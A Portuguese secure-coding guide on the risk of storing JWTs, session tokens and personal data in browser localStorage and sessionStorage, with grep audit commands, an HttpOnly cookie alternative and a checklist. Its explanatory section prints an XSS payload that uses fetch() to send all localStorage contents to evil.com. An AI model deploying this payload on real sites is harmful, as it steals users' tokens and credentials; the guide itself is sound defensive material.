# localStorage e sessionStorage — Dados Sensíveis no Cliente

Armazenar dados sensíveis em storage do browser expõe a XSS.

---

## Por que é Perigoso

localStorage e sessionStorage são acessíveis por qualquer JavaScript da página. Um ataque XSS pode exfiltrar todo o conteúdo:

```javascript
// Payload XSS para roubar localStorage
fetch('https://evil.com/steal?' + JSON.stringify(localStorage))
Object.keys(localStorage).forEach(k => 
  fetch(`https://evil.com/?key=${k}&val=${localStorage.getItem(k)}`))
```

---

## Busca

```bash
# JWT/tokens em localStorage
grep -rn "localStorage\.setItem\|localStorage\[" --include="*.{js,ts,jsx,tsx}" -n | grep -i "token\|jwt\|auth\|session\|user\|credential"

# sessionStorage
grep -rn "sessionStorage\.setItem" --include="*.{js,ts,jsx,tsx}" | grep -i "token\|jwt\|auth\|password\|secret"

# Dados de usuário sensíveis
grep -rn "localStorage\.setItem\s*(\s*['\"]" --include="*.{js,ts,jsx,tsx}" -n | grep -i "credit\|card\|ssn\|cpf\|password\|senha"

# Patterns de auth em next-auth, firebase, etc.
grep -rn "localStorage.*token\|token.*localStorage" --include="*.{js,ts,jsx,tsx}" -n
```

---

## O que NÃO deve estar em localStorage

- JWT de autenticação/autorização
- Session tokens
- Dados de cartão de crédito (qualquer parte)
- CPF, RG, número de previdência
- Tokens de API com permissões
- Senhas (mesmo temporariamente)

---

## O que PODE estar em localStorage

- Preferências de UI (tema, idioma)
- Cache de dados públicos
- Estado de UI não-sensível
- IDs de sessão não-privilegiada (com cautela)

---

## Alternativa Segura

```javascript
// Em vez de localStorage, usar HttpOnly Cookie
// (não acessível via JavaScript)
// Configurar no servidor:
res.cookie('auth_token', token, {
  httpOnly: true,  // não acessível via JS
  secure: true,    // apenas HTTPS
  sameSite: 'strict',
  maxAge: 3600000,
})
```

---

## Checklist

- [ ] JWT de autenticação não armazenado em localStorage
- [ ] Dados de cartão/CPF não armazenados no cliente
- [ ] Tokens de API não em localStorage
- [ ] Tokens de auth em HttpOnly cookies quando possível

---

## Red Flags

1. `localStorage.setItem('token', jwtToken)` — padrão comum em tutoriais mas inseguro
2. `localStorage.setItem('user', JSON.stringify({...password...}))` — nunca
3. Token de stripe ou outro pagamento em localStorage
